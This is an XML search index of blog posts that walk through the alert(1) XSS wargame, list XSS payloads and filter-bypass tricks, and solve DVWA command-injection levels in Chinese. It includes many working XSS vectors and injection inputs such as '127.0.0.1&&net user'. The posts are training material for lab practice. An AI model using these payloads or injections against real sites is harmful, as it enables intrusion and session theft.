<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Wargame-XSS-game]]></title>
    <url>%2F2018%2F08%2F03%2FWargame-alert(1)-haozi%2F</url>
    <content type="text"><![CDATA[Wargame XSS-alert(1)0x00 没有任何过滤server codefunction render (input) { return &apos;&lt;div&gt;&apos; + input + &apos;&lt;/div&gt;&apos; } 分析对输入 input没有做任何的过滤，直接在div标签之间输出了 input code&lt;script&gt;alert(1)&lt;/script&gt; 0x01 textarea标签server codefunction render (input) { return &apos;&lt;textarea&gt;&apos; + input + &apos;&lt;/textarea&gt;&apos; } 分析对于输出input没有做任何的过滤，将input输出在了 textarea标签里,使用”“闭合前面的标签即可 Input code&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt; 0x02 input标签server codefunction render (input) { return &apos;&lt;input type=&quot;name&quot; value=&quot;&apos; + input + &apos;&quot;&gt;&apos; } 分析这里返回了一个input标签，只需要闭合前面的双引号和尖括号即可 “&gt;或者是在input标签里使用onfocus事件，加上autofocus自动执行，无需交互 Input code1&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 1&quot; onfocus=javascript:alert(1) autofocus&gt; 0x03 过滤圆括号和方括号server codefunction render (input) { const stripBracketsRe = /[()]/g input = input.replace(stripBracketsRe, &apos;&apos;) return input } 分析使用正则表达式全局匹配将[]和()替换成空字符 Input code1、使用 反撇号 ` 代替圆括号 &lt;img src=0 onerror=&quot;alert`1`&quot;&gt; 2、将圆括号进行html实体编码 &lt;img src=1 onerror=alert&amp;#40;1&amp;#41;&gt; &lt;img src=1 onerror=alert&amp;#x28;1&amp;#x29&gt; &lt;img src=1 onerror=alert&amp;lpar;1&amp;rpar;&gt; 0x04 过滤方括号、圆括号、反撇号server codefunction render (input) { const stripBracketsRe = /[()`]/g input = input.replace(stripBracketsRe, &apos;&apos;) return input } 分析过滤了方括号、圆括号、反撇号 Input code使用HTML实体编码绕过 &lt;img src=1 onerror=alert&amp;#40;1&amp;#41;&gt; &lt;img src=1 onerror=alert&amp;#x28;1&amp;#x29&gt; &lt;img src=1 onerror=alert&amp;lpar;1&amp;rpar;&gt; &lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41&lt;/script 0x05 绕过注释符server codefunction render (input) { input = input.replace(/--&gt;/g, &apos;😂&apos;) return &apos;&lt;!-- &apos; + input + &apos; --&gt;&apos; } 分析全局过滤了- 和 &gt; 防止我们闭合注释 使用–!&gt;绕过并跳出注释； html注释：或者 Input code--!&gt;&lt;script&gt;alert(1)&lt;/script&gt; 0x06 换行绕过server codefunction render (input) { input = input.replace(/auto|on.*=|&gt;/ig, &apos;_&apos;) return `&lt;input value=1 ${input} type=&quot;text&quot;&gt;` } 分析全局匹配无论大小写以auto开头或者on开头=结尾的字符串，将其替换成_而且可以看到输出点限制在了input标签内 Input codetype=image src onerror =alert(1) 2、使用换行符绕过正则匹配 onclick = alert(1) 0x07server codefunction render (input) { const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi input = input.replace(stripTagsRe, &apos;&apos;) return `&lt;article&gt;${input}&lt;/article&gt;` } 分析匹配以 &lt;开头 &gt; 结尾的字符串\/? 匹配 / 零次或一次[^&gt;] 该表达式匹配除 &gt; 之外的其他字符 Input code利用浏览器容错性，去掉&gt;闭合绕过；最后加个空格或者回车 &lt;svg/onload=&apos;alert(1)&apos; &lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41; &lt;svg/onload=alert(1) 0x08server codefunction render (src) { src = src.replace(/&lt;\/style&gt;/ig, &apos;/* \u574F\u4EBA */&apos;) return ` &lt;style&gt; ${src} &lt;/style&gt; ` } 分析将&lt;/style&gt;替换掉 在&gt;前面加个空格绕过 &lt;/style &gt; Input code1、在标签&gt;闭合前加空格绕过； &lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt; 2、在标签&gt;闭合前换行绕过； &lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt; 0x09server codefunction render (input) { let domainRe = /^https?:\/\/www\.segmentfault\.com/ if (domainRe.test(input)) { return `&lt;script src=&quot;${input}&quot;&gt;&lt;/script&gt;` } return &apos;Invalid URL&apos; } 分析验证url是不是 https://www.segmentfault.com可以接着在后面闭合构造或者在构造符合要求的url去调用 正则匹配以https://www.segmentfault.com开头的输入，若无匹配返回失败； input code闭合前面的 script https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot; 或者构造url调用自己的js代码 https://www.segmentfault.com.xxxxx.xxxx/xss.js 0x0Aserver codefunction render (input) { function escapeHtml(s) { return s.replace(/&amp;/g, &apos;&amp;amp;&apos;) .replace(/&apos;/g, &apos;&amp;#39;&apos;) .replace(/&quot;/g, &apos;&amp;quot;&apos;) .replace(/&lt;/g, &apos;&amp;lt;&apos;) .replace(/&gt;/g, &apos;&amp;gt;&apos;) .replace(/\//g, &apos;&amp;#x2f&apos;) } const domainRe = /^https?:\/\/www\.segmentfault\.com/ if (domainRe.test(input)) { return `&lt;script src=&quot;${escapeHtml(input)}&quot;&gt;&lt;/script&gt;` } return &apos;Invalid URL&apos; } 分析将 &amp; ‘ “ &lt; &gt; / 全局替换为实体字符但是可以使用以https://www.segmentfault.com开头的url链接去调用js Input codehttps://www.segmentfault.com.af/alert.js 0x0Bserver codefunction render (input) { input = input.toUpperCase() return `&lt;h1&gt;${input}&lt;/h1&gt;` } 分析将输入的所有字符都转换为大写大写的ALERT不是有效的JavaScript函数，用编码绕过小写到大写的替换即可 Input code&lt;img src=0 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; &lt;svg&gt;&lt;img src=0 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; &lt;svg&gt;&lt;script&gt;&lt;img src=0 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;&lt;/script&gt; 0x0Cserver codefunction render (input) { input = input.replace(/script/ig, &apos;&apos;) input = input.toUpperCase() return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;/h1&gt;&apos; } 分析全局匹配不能使用script Input code&lt;img src=0 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; 0x0Dserver codefunction render (input) { input = input.replace(/[&lt;/&quot;&apos;]/g, &apos;&apos;) return ` &lt;script&gt; // alert(&apos;${input}&apos;) &lt;/script&gt; ` } 分析正则匹配过滤 &lt;/“‘ 替换为空字符，输出是在//注释后面 输出点直接是在script标签内，通过换行绕过//注释由于过滤了 / ，//和/**/注释失效，过滤了’ 无法使用 (‘ 闭合后面的 ‘)可使用HTML的–&gt;闭合绕过 input code1 alert(1) --&gt; 0x0Eserver codefunction render (input) { input = input.replace(/&lt;([a-zA-Z])/g, &apos;&lt;_$1&apos;) input = input.toUpperCase() return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;/h1&gt;&apos; } 分析正则匹配以&lt;开头，后面接英文字母大小写字符 即 &lt;+字母 的替换掉 查资料发现字符ſ大写后为S（ſ不等于s） input&lt;ſcript src=0 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;&lt;/script&gt; 0x0Fserver codefunction render (input) { function escapeHtml(s) { return s.replace(/&amp;/g, &apos;&amp;amp;&apos;) .replace(/&apos;/g, &apos;&amp;#39;&apos;) .replace(/&quot;/g, &apos;&amp;quot;&apos;) .replace(/&lt;/g, &apos;&amp;lt;&apos;) .replace(/&gt;/g, &apos;&amp;gt;&apos;) .replace(/\//g, &apos;&amp;#x2f;&apos;) } return `&lt;img src onerror=&quot;console.error(&apos;${escapeHtml(input)}&apos;)&quot;&gt;` } 分析正则表达式将 &amp; ‘ “ &lt; &gt; / 转换为实体符 console.error()向 Web 控制台输出一条错误消息。 虽然对很多字符进行了转义，但转义的结果仍在引号中，会被再次解释，故当做没有任何转义即可 input code&apos;);alert(&apos;1 0x010server codefunction render (input) { return ` &lt;script&gt; window.data = ${input} &lt;/script&gt; ` } 分析没有做任何过滤 input codealert(1) 0x11server code// from alf.nu function render (s) { function escapeJs (s) { return String(s) .replace(/\\/g, &apos;\\\\&apos;) .replace(/&apos;/g, &apos;\\\&apos;&apos;) .replace(/&quot;/g, &apos;\\&quot;&apos;) .replace(/`/g, &apos;\\`&apos;) .replace(/&lt;/g, &apos;\\74&apos;) .replace(/&gt;/g, &apos;\\76&apos;) .replace(/\//g, &apos;\\/&apos;) .replace(/\n/g, &apos;\\n&apos;) .replace(/\r/g, &apos;\\r&apos;) .replace(/\t/g, &apos;\\t&apos;) .replace(/\f/g, &apos;\\f&apos;) .replace(/\v/g, &apos;\\v&apos;) // .replace(/\b/g, &apos;\\b&apos;) .replace(/\0/g, &apos;\\0&apos;) } s = escapeJs(s) return ` &lt;script&gt; var url = &apos;javascript:console.log(&quot;${s}&quot;)&apos; var a = document.createElement(&apos;a&apos;) a.href = url document.body.appendChild(a) a.click() &lt;/script&gt; ` } 分析在 \\ &apos; ` &lt; &gt; \ \n \r \t \f \v 前面加 \ input code&quot;);alert(1)(&quot; 0x12server code// from alf.nu function escape (s) { s = s.replace(/&quot;/g, &apos;\\&quot;&apos;) return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos; } 分析正则表达式将双引号进行了使用\转义我们可以在加一个\将\再转义一次 input code\&quot;);alert(1);// 参考PayloadsAllTheThings XSS插入绕过一些方式总结 可以被XSS利用的HTML标签和一些手段技巧]]></content>
      <tags>
        <tag>practice</tag>
        <tag>XSS</tag>
        <tag>XSS-game</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS Base]]></title>
    <url>%2F2018%2F08%2F03%2FXSS-base%2F</url>
    <content type="text"><![CDATA[XSS Base能够执行js的标签、事件、属性标签&lt;script&gt; &lt;a&gt; &lt;p&gt; &lt;img&gt; &lt;body&gt; &lt;button&gt; &lt;var&gt; &lt;div&gt; &lt;iframe&gt; &lt;object&gt; &lt;input&gt; &lt;select&gt; &lt;textarea&gt; &lt;keygen&gt; &lt;frameset&gt; &lt;embed&gt; &lt;svg&gt; &lt;math&gt; &lt;video&gt; &lt;audio&gt; 所有的event事件都可以执行jsonload onunload onchange onchange onsubmit onreset onselect onblur onfocus onabort onkeydown onkeypress onkeyup onclick ondbclick onmouseover onmousemove onmouseout onmouseup onforminput onformchange ondrag ondrop 可以执行js的属性formaction action href xlink:href autofocus src content data xss绕过方式自定义标签&lt;M/onclick=&quot;alert(1)&quot;&gt;M / 代替 空格在标签和属性之间不一定只能出现空格,使用/代替空格 &lt;img/src=x onerror=alert(1)&gt; 最短字符a标签1、通过JavaScript伪造协议来调用js &lt;a href=javascript:alert(1)&gt;A 2、通过data协议来执行JavaScript，进一步的话可以对payload进行编码（base64，urlencode,hex,demical,html实体编码）(不进行编码也是可以的) &lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt; //base64解码为&lt;script&gt;alert(1)&lt;/script&gt; &lt;a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E&gt;M &lt;a href=j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)&gt;M &lt;svg&gt;&lt;a xlink:href=&quot;javascript:alert(14)&quot;&gt;&lt;rect width=&quot;1000&quot; height=&quot;1000&quot; fill=&quot;white&quot;/&gt;&lt;/a&gt;&lt;/svg&gt; &lt;math&gt;&lt;a xlink:href=javascript:alert(1)&gt;M 各种编码绕过百分之百分号把%给url编码成%25，如果在后台对参数有再次进行urldecode，或者输出时有urldecode那么就可以绕过WAF， base64编码绕过不过滤&lt;&gt;但过滤script 和事件操作 onxxxx的时候，使用base64编码来绕过 &lt;iframe src=”data:text/html;base64,PHNjcmlwdD5hbGVydCgnYmFzZTY0X2lmcmFtZScpPC9zY3JpcHQ+”&gt; HTML实体编码的利用绕过waf&lt;a href= ‘javascript:alert&amp;#40;&amp;#39;123&amp;#39;&amp;#41; ‘&gt;Hello&lt;/a&gt; &lt;a href= “j&amp;#97;vascript:alert&amp;#40; ’123′ &amp;#41;“&gt;Hello&lt;/a &gt; &lt;a href= “j&amp;#97;vascript:alert&amp;#0000040; ’123′ &amp;#41;“&gt;Hello&lt;/a &gt; &lt;a href= “j&amp;#97vascript:alert&amp;#0000040’123′ &amp;#41“&gt;Hello&lt;/a &gt; 在标签内的所有伪协议JS代码都是可以不用双引号包裹的 eval函数eval函数认识\x十六进制\八进制\uunicode码（记得使用引号） &lt;a href=&quot;j&amp;#97;vascript:eval(&apos;&amp;#97;\x6c\x65\x72\x74\x28\x22\x31\x22\x29&apos;)&quot;&gt;Hello&lt;/a&gt; &lt;a href=&quot;j&amp;#97;vascript:eval(&apos;&amp;#97;\u0091\x65\x72\x74\x28\x22\x31\x22\x29&apos;)&quot;&gt;Hello&lt;/a&gt; &lt;a href=&quot;j&amp;#97;vascript:eval(&apos;&amp;#97;\154\x65\x72\x74\x28\x22\x31\x22\x29&apos;)&quot;&gt;Hello&lt;/a&gt; script标签1、jsfuck编码 http://www.jsfuck.com/ &lt;script&gt;alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])&lt;/script&gt; 2、不规范的script标签 &lt;script firefox&gt;alert(1)&lt;/script&gt; 3、可以用”/“来代替单引号和双引号 script&gt;alert(/3/)&lt;/script&gt; 4、如果输出是在setTimeout里，我们依然可以直接执行alert(1) &lt;script&gt;setTimeout(&apos;alert(1)&apos;,0)&lt;/script&gt; 5、不只是alert。prompt和confirm也可以弹窗 &lt;script&gt;prompt(-[])&lt;/script&gt; 6、各种编码方式 &lt;script&gt;alert(String.fromCharCode(49))&lt;/script&gt; button标签1、通过event事件来实现 &lt;button/onclick=alert(1)&gt;M&lt;/button&gt; 2、如果on(event)被过滤了 &lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;M 加上autofocus自动弹窗，无需交互 &lt;button onfocus=alert(1) autofocus&gt; p标签如果变量输出在p标签里，不一定要跳出标签，只要跳出””即可 &lt;p/onmouseover=javascript:alert(1);&gt;M&lt;/p&gt; img标签&lt;img src=x onerror=alert(1)&gt; &lt;img src ?itworksonchrome&gt;\/onerror = alert(1)&gt; //只在chrome下有效 &lt;img src=x onerror=window.open(&apos;http://google.com&apos;);&gt; &lt;img/src/onerror=alert(1)&gt; //只在chrome下有效 &lt;img src=&quot;x:test&quot; onerror=&quot;alert(1)&quot;&gt; body标签通过使用event来调用 &lt;body onload=alert(1)&gt; &lt;body onscroll=alert(1)&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt; var标签&lt;var onmouseover=&quot;prompt(1)&quot;&gt;test&lt;/var&gt; div标签&lt;div/onmouseover=&apos;alert(1)&apos;&gt;test &lt;div style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; onclick=&quot;alert(1)&quot;&gt; iframe标签meta标签跳出当前属性在添加http-equiv=”refresh”，或者通过给http-equiv设置set-cookie来，进一步重新设置cookie &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;javascript&amp;colon;alert(1)&quot;/&gt;? &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt; object标签和a标签的href属性玩法是一样的，不过优点是无须交互 &lt;object&gt; data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&gt;&lt;/object&gt; marquee标签&lt;marquee onstart=&quot;alert(&apos;sometext&apos;)&quot;&gt;&lt;/marquee&gt; isindex标签&lt;isindex type=image src=1 onerror=alert(1)&gt; &lt;isindex action=javascript:alert(1) type=image&gt; input标签通过event来调用js。和之前的button的例子一样通过 autofocus来达到无须交互即可 &lt;input onfocus=javascript:alert(1) autofocus&gt; &lt;input onblur=javascript:alert(1) autofocus&gt;&lt;input autofocus&gt; select标签&lt;select onfocus=javascript:alert(1) autofocus&gt; textarea标签&lt;textarea onfocus=javascript:alert(1) autofocus&gt; keygen标签&lt;keygen onfocus=javascript:alert(1) autofocus&gt; frameset标签&lt;frameset onload=alert(1)&gt; &lt;embed标签&gt;&lt;embed src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&quot;&gt;&lt;/embed&gt; //chrome &lt;embed src=javascript:alert(1)&gt; //firefox svg标签&lt;svg onload=&quot;javascript:alert(1)&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;/svg&gt; &lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;g onload=&quot;javascript:alert(1)&quot;&gt;&lt;/g&gt;&lt;/svg&gt; //chrome有效 math标签&lt;math href=&quot;javascript:javascript:alert(1)&quot;&gt;CLICKME&lt;/math&gt; &lt;math&gt;&lt;y/xlink:href=javascript:alert(51)&gt;test1 &lt;math&gt; &lt;maction actiontype=&quot;statusline#http://wangnima.com&quot; xlink:href=&quot;javascript:alert(49)&quot;&gt;CLICKME&lt;/maction&gt; &lt;/math&gt; video标签&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt; &lt;video src=x onerror=alert(48)&gt; audio标签&lt;audio src=x onerror=alert(47)&gt; 在这些标签里面凡是出现在on*事件值里面的javascript:都是多余的 平时搞XSS可能会用得到的技巧Referer为空才可以访问有一些界面为了避免是别的地方跳转过来的 Referer必须为空，那什么情况Referer为空呢，第一是HTTPS协议到HTTP的协议，这时候Referer为空，或者用嵌入一个iframe用data加base64编码的方式，还可以用&lt;meta name=”referrer” content=”never” &gt;来达到referer为空 注意返回的type类型返回什么样的类型决定了浏览器渲染还是不渲染你的XSS代码，只有返回的是XML或者HTML 才有可能会执行成功你的XSS代码，不过不同浏览器的特性不同，有一些返回的type类型可能也是可以执行XSS的，尤其是一些老的ie浏览器，具体可以看看freebuf之前发布过的一篇关于type和浏览器执行的表格。 阻止浏览器302跳转总所总之，浏览器遇到302，301会直接跟进头部的跳转链接，可是有时候XSS界面就是这个跳转页面，这个跳转url是可控的，并且在浏览器显示如果浏览器没有正确跳转，请点击XXX的字样。那怎么样才可以让浏览器不自动跳转呢？一种就是把跳转的url端口设置低于80 譬如输入http://xss.com:0” onclick=”alert(/1/) ,还可以使用CSP策略嵌入一个iframe 拿来配合CRLF进行XSS会很舒服 注意头部的X-XSS-Protection这个东西就是让浏览器帮助一起防御XSS 为0则不帮助，为1则把可能含有的在代码中直接拿掉，还有一个是类型1;black这样的，就是在url地址直接把认为可能是xss的拿掉，所以有时候并不是你的XSS代码被服务器过滤了，还有可能是被浏览器拿走了 HTML Entity介绍在编写HTML页面时，需要用到”&lt;”、”&gt;”、”空格”等符号，直接输入这些符号时，会错误的把它们与标记混在一起，非常不利于编码。 那么就需要把这些字符进行转义，以另一种方式抒写，以相同的形式展现。 在HTML中，这些字符可称为HTML Entity，即HTML 字符实体。一个HTML Entity都含有2种转义格式：Entity Name 和 Entity Number。 Entity Name格式： &entityName; 说明：”&amp;”开头，”;”结尾，以语义的形式描述字符。如字符”&lt;”，英文名称为”less than”，Entity Name为”&lt;”，取自”less than”2个单词的首字母。 Entity Number格式： &#entityNumber; 说明：”&amp;#”开头，”;”结尾，以编号的形式描述字符。此编号可以为十进制或十六进制(以”&amp;#x”开头)等数字格式。 示例&lt;p&gt;字符 ：&lt;&lt;/p&gt; &lt;p&gt;Entity Name ：&amp;lt;&lt;/p&gt; &lt;p&gt;Entity Number(十进制) ：&amp;#60;&lt;/p&gt; &lt;p&gt;Entity Number(十六进制) ：&amp;#x3c;&lt;/p&gt; Character Character Entity Entity Number(十进制) Entity Number(十六进制) &amp;nbsp; &amp;#32; &amp;#x ! &amp;excl; &amp;#33; &amp;#x21 &quot; &amp;quot; &amp;#34; &amp;#x22 # &amp;num; &amp;#35; &amp;#x23 $ &amp;dollar; &amp;#36; &amp;#x24 % &amp;percnt; &amp;#37; &amp;#x25 &amp; &amp;amp; &amp;#38; &amp;#x26 &apos; &amp;apos; &amp;#39; &amp;#x27 ( &amp;lpar; &amp;#40; &amp;#x28 ) &amp;rpar; &amp;#41; &amp;#x29 * &amp;ast; &amp;#42; &amp;#x2A + &amp;plus; &amp;#43; &amp;#x2B , &amp;comma; &amp;#44; &amp;#x2C - &amp;hyphen; &amp;#45; &amp;#x2D . &amp;period; &amp;#46; &amp;#x2E / &amp;sol; &amp;#47; &amp;#x2F : &amp;colon; &amp;#58; &amp;#x3A ; &amp;semi; &amp;#59; &amp;#x3B &lt; &amp;lt; &amp;#60; &amp;#x3C = &amp;equals; &amp;#61; &amp;#x3D &gt; &amp;gt; &amp;#62; &amp;#x3E ? &amp;quest; &amp;#63; &amp;#x3F @ &amp;commat; &amp;#64; &amp;#x40 [ &amp;lsqb; &amp;#91; &amp;#x5B \ &amp;bsol; &amp;#92; &amp;#x5C ] &amp;rsqb; &amp;#93; &amp;#x5D ^ &amp;circ; &amp;#94; &amp;#x5E _ &amp;lowbar; &amp;#95; &amp;#x5F ` &amp;grave; &amp;#96; &amp;#x60 { &amp;lcub; &amp;#123; &amp;#x7B | &amp;verbar; &amp;#124; &amp;#x7C } &amp;rcub; &amp;#125; &amp;#x7D ~ &amp;tilde; &amp;#126; &amp;#x7E 参考了解XSS攻击 SVG XSS的一个黑魔法 可以被XSS利用的HTML标签和一些手段技巧 HTML Entity字符实体 HTML Entity 字符对照表]]></content>
      <tags>
        <tag>practice</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-File_Injection]]></title>
    <url>%2F2018%2F07%2F31%2FDVWA-Command_Injection%2F</url>
    <content type="text"><![CDATA[命令注入介绍Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。 LowCommand Injection Source&lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Get input $target = $_REQUEST[ &apos;ip&apos; ]; // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 分析tristr(string,search,before_search) stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。 php_uname(mode) 这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。 服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞 漏洞利用window和linux系统都可以用&amp;&amp;来执行多条命令 注意：如果在ping命令后使用&amp;&amp;号但没有给ping命令输入IP地址时，这时候将不会返回任何值，因为&amp;&amp;号后面命令是建立在前面命令已经正确执行的前提之下的，另外也有两个管道符（||）的用法，但是条件是前面的命令执行失败，和&amp;&amp;号的相反 127.0.0.1&amp;&amp;net user 由于编码的问题，可能看到的是乱码，但是在源代码中可以看到 127.0.0.1&amp;&amp;whoami 127.0.0.1&amp;&amp;net localgroup administrators MiddleCommand Injection Source&lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Get input $target = $_REQUEST[ &apos;ip&apos; ]; // Set blacklist $substitutions = array( &apos;&amp;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 分析将 &amp;&amp; 和 ; 替换成了空字符，本质上采用的是黑名单机制,但是我们还可以用&amp;号、管道符|等直接绕过 &amp;号与&amp;&amp;号不同，因为是同时执行，所以并不存在前面的命令必须执行了后面的命令才能执行的问题。例子中不输入IP地址也能执行后面的命令： 管道符能正常执行，但管道符的限制是只显示后面那条命令的执行结果： 漏洞利用利用方式1127.0.0.1&amp;net user 127.0.0.1|whoami 利用方式2因为会过滤掉 &amp;&amp; 和 ; 如果我们狗造成 &amp;;&amp; —–&gt; &amp;&amp; 127.0.0.1&amp;;&amp;ipconfig HighCommand Injection Source&lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Get input $target = trim($_REQUEST[ &apos;ip&apos; ]); // Set blacklist $substitutions = array( &apos;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, &apos;| &apos; =&gt; &apos;&apos;, &apos;-&apos; =&gt; &apos;&apos;, &apos;$&apos; =&gt; &apos;&apos;, &apos;(&apos; =&gt; &apos;&apos;, &apos;)&apos; =&gt; &apos;&apos;, &apos;`&apos; =&gt; &apos;&apos;, &apos;||&apos; =&gt; &apos;&apos;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 分析关键代码 &apos;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, &apos;| &apos; =&gt; &apos;&apos;, &apos;-&apos; =&gt; &apos;&apos;, &apos;$&apos; =&gt; &apos;&apos;, &apos;(&apos; =&gt; &apos;&apos;, &apos;)&apos; =&gt; &apos;&apos;, &apos;`&apos; =&gt; &apos;&apos;, &apos;||&apos; =&gt; &apos;&apos;, 这里进一步完善了黑名单机制，但是仔细看，会发现第三个是将’| ‘替换为空格，可以看到在管道符后面还有一个空格，我们可以使用 ‘ |’将空格放到前面来绕过,或者在 | 前后不留有空格 “|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果 漏洞利用127.0.0.1 |net user 127.0.0.1|dir ImossibleCommand Injection Source&lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $target = $_REQUEST[ &apos;ip&apos; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int&apos;s put the IP back together. $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } else { // Ops. Let the user name theres a mistake echo &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; stripslashes(string) stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。 explode(separator,string,limit) 把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。 is_numeric(string) 检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE 分析关键部分 checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); 使用csrf防范机制，检查客户端和服务端的token是否相同 $target = stripslashes( $target ); 将变量的值进行实体化 $octet = explode( &quot;.&quot;, $target ); 将IP地址分割成四部分，并且检查是否是数字，而且长度是否为四，然后将这四部分连接起来]]></content>
      <tags>
        <tag>DVWA</tag>
        <tag>practice</tag>
        <tag>File_Injection</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-File_Upload]]></title>
    <url>%2F2018%2F07%2F30%2FDVWA-File_Upload%2F</url>
